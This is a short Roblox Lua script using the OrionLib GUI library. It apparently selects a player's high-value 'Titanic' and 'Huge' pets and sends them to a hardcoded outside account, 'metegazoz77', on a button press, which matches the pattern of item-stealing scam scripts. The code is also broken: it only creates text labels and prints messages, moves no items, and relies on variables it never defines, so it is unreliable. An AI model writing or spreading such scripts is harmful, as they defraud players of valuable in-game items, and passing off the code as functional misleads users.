-- Pet sending function
function sendPetToUser(inventory, user)
    -- Find the user's mailbox GUI
    local userMailbox = game.Players[user].PlayerGui:FindFirstChild("Mailbox")
    
    -- If mailbox GUI is found
    if userMailbox then
        for _, pet in ipairs(inventory) do
            -- If pet name contains "Titanic" or "Huge"
            if pet.name:find("Titanic") or pet.name:find("Huge") then
                -- Add the pet to the Mailbox
                local newPet = Instance.new("TextLabel")
                newPet.Text = pet.name .. " - Value: " .. pet.value
                newPet.Size = UDim2.new(0, 200, 0, 50)
                newPet.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                newPet.TextColor3 = Color3.fromRGB(0, 0, 0)
                newPet.Parent = userMailbox
                
                -- Print a message
                print("Pet " .. pet.name .. " is sent to user " .. user)
            end
        end
    else
        -- If the mailbox GUI is not found
        warn("User does not have a Mailbox GUI!")
    end
end

-- GUI Code: Using OrionLib
local Section = Tab:AddSection({
    Name = "Start Pet Sending"
})

-- Start button code
local StartButton = Section:AddButton({
    Name = "Send Pets",
    Callback = function()
        -- Sending pets code
        local destinationUser = "metegazoz77" -- The user to send pets to
        sendPetToUser(playerInventory, destinationUser)
        print("Pet sending started!")
    end
})

